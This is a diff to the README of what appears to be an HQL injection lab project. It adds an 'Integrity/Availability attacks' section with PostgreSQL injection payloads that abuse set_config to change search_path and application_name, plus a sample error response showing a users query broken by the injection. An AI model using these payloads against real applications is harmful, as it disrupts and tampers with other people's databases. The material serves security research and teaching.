@@ -314,6 +314,27 @@ Stop everything with:
 docker compose down -v
 ```
 
+## Integrity/Availability attacks
+
+### PostgreSQL
+
+`function('set_config','search_path','attk', false) = 'attk'`
+
+`x' OR function('set_config','search_path','attk', false) = 'attk' OR '1'='2`
+
+`function('set_config','search_path','pg_catalog,public', false) = 'pg_catalog,public'`
+`function('set_config','application_name','', false) = ''`
+
+```json
+{
+    "msgInfo": {
+        "message": "org.hibernate.exception.SQLGrammarException: JDBC exception executing SQL [select count(*) from users u1_0 where u1_0.user_id='x' or set_config('search_path','pg_catalog,public',false)='pg_catalog,public' or '1'='2' or u1_0.alt_user_id='x' or set_config('search_path','pg_catalog,public',false)='pg_catalog,public' or '1'='2'] [ERROR: relation \"users\" does not exist\n  Position: 22] [n/a]",
+        "msgStatus": "failure",
+        "statusCode": "401"
+    }
+}
+```
+
 ## Project Structure
 - `src/main/java/com/pdstat/hqli/` - Java source code for the REST API
 - `hqli-all.py` - Python enumeration script
